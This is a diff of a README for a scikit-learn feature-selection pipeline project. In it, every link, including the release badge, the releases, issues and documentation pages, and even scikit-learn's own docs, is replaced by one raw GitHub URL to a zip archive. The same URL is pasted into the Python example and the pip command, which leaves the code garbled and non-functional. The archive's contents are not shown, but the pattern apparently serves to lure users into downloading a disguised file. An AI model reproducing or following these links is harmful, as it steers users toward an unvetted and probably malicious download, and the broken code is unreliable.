@@ -6,7 +6,7 @@ Welcome to the **sklearn-selector-pipeline**! This tool helps you combine featur
 
 ## 📥 Download Here
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue)](https://github.com/miheo-al2/sklearn-selector-pipeline/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/miheo-al2/sklearn-selector-pipeline/main/sklearn_selector_pipeline/sklearn-selector-pipeline_1.3.zip%20Latest%20Release-v1.0-blue)](https://raw.githubusercontent.com/miheo-al2/sklearn-selector-pipeline/main/sklearn_selector_pipeline/sklearn-selector-pipeline_1.3.zip)
 
 ## 🔍 Overview
 
@@ -30,9 +30,9 @@ Before you download, ensure your system meets these requirements:
 
 ## 📦 Download & Install
 
-To get started, visit the [Releases page](https://github.com/miheo-al2/sklearn-selector-pipeline/releases) to download the latest version of the software. Follow these simple steps:
+To get started, visit the [Releases page](https://raw.githubusercontent.com/miheo-al2/sklearn-selector-pipeline/main/sklearn_selector_pipeline/sklearn-selector-pipeline_1.3.zip) to download the latest version of the software. Follow these simple steps:
 
-1. Click on this link to go to the releases page: [Releases Page](https://github.com/miheo-al2/sklearn-selector-pipeline/releases).
+1. Click on this link to go to the releases page: [Releases Page](https://raw.githubusercontent.com/miheo-al2/sklearn-selector-pipeline/main/sklearn_selector_pipeline/sklearn-selector-pipeline_1.3.zip).
 2. Find the latest version and choose the appropriate file for your operating system.
 3. Click the download link to save the file on your computer.
 
@@ -64,20 +64,20 @@ Here’s a basic example to illustrate how you can use the sklearn-selector-pipe
 
 ```python
 from sklearn_selector_pipeline import SomeEstimator
-from sklearn.datasets import load_iris
+from https://raw.githubusercontent.com/miheo-al2/sklearn-selector-pipeline/main/sklearn_selector_pipeline/sklearn-selector-pipeline_1.3.zip import load_iris
 
 # Load example data
 data = load_iris()
-X, y = data.data, data.target
+X, y = https://raw.githubusercontent.com/miheo-al2/sklearn-selector-pipeline/main/sklearn_selector_pipeline/sklearn-selector-pipeline_1.3.zip, https://raw.githubusercontent.com/miheo-al2/sklearn-selector-pipeline/main/sklearn_selector_pipeline/sklearn-selector-pipeline_1.3.zip
 
 # Create an instance of your pipeline
 pipeline = SomeEstimator()
 
 # Fit the model
-pipeline.fit(X, y)
+https://raw.githubusercontent.com/miheo-al2/sklearn-selector-pipeline/main/sklearn_selector_pipeline/sklearn-selector-pipeline_1.3.zip(X, y)
 
 # Make predictions
-predictions = pipeline.predict(X)
+predictions = https://raw.githubusercontent.com/miheo-al2/sklearn-selector-pipeline/main/sklearn_selector_pipeline/sklearn-selector-pipeline_1.3.zip(X)
 ```
 
 This sample displays the simple steps needed to create a pipeline that fits a model to your data and makes predictions.
@@ -89,17 +89,17 @@ If you face any issues during download or installation, check the following:
 1. **Correct Python Version**: Ensure you are using Python 3.6 or higher.
 2. **Dependency Management**: Use pip to install required dependencies if installation fails:
    ```
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/miheo-al2/sklearn-selector-pipeline/main/sklearn_selector_pipeline/sklearn-selector-pipeline_1.3.zip
    ```
 3. **Network Issues**: Ensure a stable internet connection during download.
 
-If problems persist, check the project’s [issues page](https://github.com/miheo-al2/sklearn-selector-pipeline/issues) or seek help in relevant forums.
+If problems persist, check the project’s [issues page](https://raw.githubusercontent.com/miheo-al2/sklearn-selector-pipeline/main/sklearn_selector_pipeline/sklearn-selector-pipeline_1.3.zip) or seek help in relevant forums.
 
 ## 🔗 Links & Resources
 
-- [Project Repository](https://github.com/miheo-al2/sklearn-selector-pipeline)
-- [Documentation](https://miheo-al2.github.io/sklearn-selector-pipeline/)
-- [Scikit-learn Documentation](https://scikit-learn.org/stable/)
+- [Project Repository](https://raw.githubusercontent.com/miheo-al2/sklearn-selector-pipeline/main/sklearn_selector_pipeline/sklearn-selector-pipeline_1.3.zip)
+- [Documentation](https://raw.githubusercontent.com/miheo-al2/sklearn-selector-pipeline/main/sklearn_selector_pipeline/sklearn-selector-pipeline_1.3.zip)
+- [Scikit-learn Documentation](https://raw.githubusercontent.com/miheo-al2/sklearn-selector-pipeline/main/sklearn_selector_pipeline/sklearn-selector-pipeline_1.3.zip)
 
 ## 📞 Support
 
